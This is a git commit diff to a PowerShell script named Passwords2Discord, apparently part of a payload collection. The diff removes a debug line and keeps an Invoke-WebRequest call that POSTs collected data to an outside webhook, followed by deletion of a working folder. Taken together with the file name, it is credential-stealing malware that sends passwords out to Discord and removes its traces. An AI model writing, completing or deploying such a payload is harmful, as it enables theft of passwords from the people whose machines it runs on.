6168883c22fc960d6c482a8bab05afd5e3dacdc5
Oscar <oscarrc.web@gmail.com>
2023-07-05 16:57:29 +0200

    [DONE] Passwords2discord

--- payloads/Passwords2Discord/script.ps1
+++ payloads/Passwords2Discord/script.ps1
@@ -48,7 +48,6 @@ $body = (
     ('--' + $boundary + '--' + $LF)
 ) -join $LF;
 
-Write-Output $body
 Invoke-WebRequest -Uri $hook -ContentType ('multipart/form-data; boundary=' + $boundary) -Method Post -Body $body;
 
 Remove-Item 'wbpv' -Force -Recurse;
